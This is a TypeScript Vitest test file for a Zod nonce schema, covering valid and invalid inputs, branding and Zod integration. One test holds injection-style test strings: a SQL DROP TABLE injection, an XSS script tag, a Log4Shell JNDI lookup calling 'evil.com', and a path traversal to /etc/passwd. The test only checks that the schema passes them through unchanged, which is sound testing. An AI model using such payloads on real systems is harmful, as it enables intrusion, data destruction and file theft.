import { describe, expect, it } from 'vitest';
import { z } from 'zod';
import { Nonce, nonceSchema } from '../Nonce';

describe('Nonce', () => {
  describe('nonceSchema', () => {
    describe('valid cases', () => {
      it.each([
        ['abc123def456', 'alphanumeric string'],
        ['550e8400-e29b-41d4-a716-446655440000', 'UUID format'],
        ['nonce_1234567890', 'underscore format'],
        ['nonce-with-dashes', 'hyphenated format'],
        ['a', 'single character'],
        [
          'very-long-nonce-string-with-many-characters-that-should-be-valid-for-cryptographic-purposes',
          'long nonce',
        ],
        ['BASE64EncodedString==', 'base64-like format'],
        ['HexadecimalString123ABC', 'hexadecimal-like format'],
        ['   nonce-with-spaces   ', 'nonce with surrounding spaces'],
        ['special!@#$%nonce', 'nonce with special characters'],
        ['ñóñçé123', 'nonce with Unicode characters'],
      ])('should validate %s (%s)', (validNonce, description) => {
        expect(() => nonceSchema.parse(validNonce)).not.toThrow();

        const result = nonceSchema.parse(validNonce);
        expect(result).toBe(validNonce);
      });
    });

    describe('invalid cases', () => {
      it.each([
        ['', 'empty string'],
        [null, 'null value'],
        [undefined, 'undefined value'],
        [123, 'number'],
        [[], 'empty array'],
        [{}, 'empty object'],
        [true, 'boolean true'],
        [false, 'boolean false'],
        [Symbol('nonce'), 'symbol'],
        [new Date(), 'date object'],
        [Buffer.from('nonce'), 'buffer object'],
      ])('should reject %s (%s)', (invalidInput, description) => {
        expect(() => nonceSchema.parse(invalidInput)).toThrow(z.ZodError);
      });
    });

    describe('error messages', () => {
      it('should provide meaningful error message for empty string', () => {
        expect(() => nonceSchema.parse('')).toThrow('Nonce must not be empty');
      });

      it('should provide meaningful error message for non-string types', () => {
        expect(() => nonceSchema.parse(123)).toThrow();
        expect(() => nonceSchema.parse(null)).toThrow();
        expect(() => nonceSchema.parse(undefined)).toThrow();
      });
    });

    describe('branded type behavior', () => {
      it('should create branded type that is distinct from regular string', () => {
        const nonce = nonceSchema.parse('test-nonce');
        const regularString: string = 'test-nonce';

        // Both should have the same runtime value
        expect(nonce).toBe(regularString);

        // But the branded type should be assignable to Nonce
        const brandedNonce: Nonce = nonce;
        expect(brandedNonce).toBe('test-nonce');
      });

      it('should maintain type safety in function parameters', () => {
        // This demonstrates compile-time type safety
        function storeNonce(nonce: Nonce, sessionId: string): string {
          return `nonce:${sessionId}:${nonce}`;
        }

        const validNonce = nonceSchema.parse('crypto-secure-nonce');
        const result = storeNonce(validNonce, 'session-123');

        expect(result).toBe('nonce:session-123:crypto-secure-nonce');
      });

      it('should prevent mixing with unvalidated strings at compile time', () => {
        function validateNonce(nonce: Nonce): boolean {
          return nonce.length > 0;
        }

        const validatedNonce = nonceSchema.parse('validated-nonce');
        expect(validateNonce(validatedNonce)).toBe(true);
      });
    });

    describe('cryptographic nonce scenarios', () => {
      it('should handle common cryptographic nonce formats', () => {
        const commonFormats = [
          'f47ac10b58cc4372a5670e02b2c3d479', // 32-char hex
          'ZjQ3YWMxMGI1OGNjNDM3MmE1NjcwZTAyYjJjM2Q0Nzk=', // base64
          '01234567-89ab-cdef-0123-456789abcdef', // UUID
          crypto.randomUUID(), // actual UUID
        ];

        for (const format of commonFormats) {
          expect(() => nonceSchema.parse(format)).not.toThrow();
          const result = nonceSchema.parse(format);
          expect(result).toBe(format);
        }
      });

      it('should handle nonces with various lengths', () => {
        const lengths = [1, 8, 16, 32, 64, 128, 256];

        for (const length of lengths) {
          const nonce = 'a'.repeat(length);
          expect(() => nonceSchema.parse(nonce)).not.toThrow();

          const result = nonceSchema.parse(nonce);
          expect(result).toBe(nonce);
          expect(result.length).toBe(length);
        }
      });
    });

    describe('edge cases', () => {
      it('should handle whitespace-only strings', () => {
        const whitespaceNonce = '   ';
        expect(() => nonceSchema.parse(whitespaceNonce)).not.toThrow();

        const result = nonceSchema.parse(whitespaceNonce);
        expect(result).toBe(whitespaceNonce);
      });

      it('should handle strings with newlines and tabs', () => {
        const nonceWithWhitespace = 'nonce\n\twith\twhitespace';
        expect(() => nonceSchema.parse(nonceWithWhitespace)).not.toThrow();

        const result = nonceSchema.parse(nonceWithWhitespace);
        expect(result).toBe(nonceWithWhitespace);
      });

      it('should handle very long nonces', () => {
        const longNonce = 'a'.repeat(10000);
        expect(() => nonceSchema.parse(longNonce)).not.toThrow();

        const result = nonceSchema.parse(longNonce);
        expect(result).toBe(longNonce);
        expect(result.length).toBe(10000);
      });
    });

    describe('security considerations', () => {
      it('should not modify the input nonce value', () => {
        const originalNonce = 'original-nonce-value';
        const parsedNonce = nonceSchema.parse(originalNonce);

        expect(parsedNonce).toBe(originalNonce);
        expect(parsedNonce === originalNonce).toBe(true); // Reference equality for strings
      });

      it('should handle nonces that look like injection attempts', () => {
        const suspiciousNonces = [
          'nonce"; DROP TABLE users; --',
          '<script>alert("xss")</script>',
          '${jndi:ldap://evil.com/a}',
          '../../../etc/passwd',
        ];

        for (const nonce of suspiciousNonces) {
          expect(() => nonceSchema.parse(nonce)).not.toThrow();
          const result = nonceSchema.parse(nonce);
          expect(result).toBe(nonce);
        }
      });
    });
  });

  describe('type inference', () => {
    it('should correctly infer Nonce type', () => {
      const nonce = nonceSchema.parse('test-nonce');

      // Type assertion to verify the inferred type
      const _typeCheck: Nonce = nonce;
      expect(_typeCheck).toBe('test-nonce');
    });
  });

  describe('integration with zod features', () => {
    it('should work with zod transform', () => {
      const transformedSchema = nonceSchema.transform((nonce) =>
        nonce.toUpperCase()
      );

      const result = transformedSchema.parse('lowercase-nonce');
      expect(result).toBe('LOWERCASE-NONCE');
    });

    it('should work with zod optional', () => {
      const optionalSchema = nonceSchema.optional();

      expect(optionalSchema.parse(undefined)).toBeUndefined();
      expect(optionalSchema.parse('valid-nonce')).toBe('valid-nonce');
    });

    it('should work with zod refinement', () => {
      const refinedSchema = nonceSchema.refine((nonce) => nonce.length >= 8, {
        message: 'Nonce must be at least 8 characters long',
      });

      expect(() => refinedSchema.parse('short')).toThrow(
        'Nonce must be at least 8 characters long'
      );
      expect(() => refinedSchema.parse('long-enough-nonce')).not.toThrow();
    });

    it('should work in object schemas', () => {
      const sessionSchema = z.object({
        sessionId: z.string(),
        nonce: nonceSchema,
        createdAt: z.date(),
      });

      const validSession = {
        sessionId: 'session-123',
        nonce: nonceSchema.parse('crypto-nonce'),
        createdAt: new Date(),
      };

      expect(() => sessionSchema.parse(validSession)).not.toThrow();
    });
  });
});
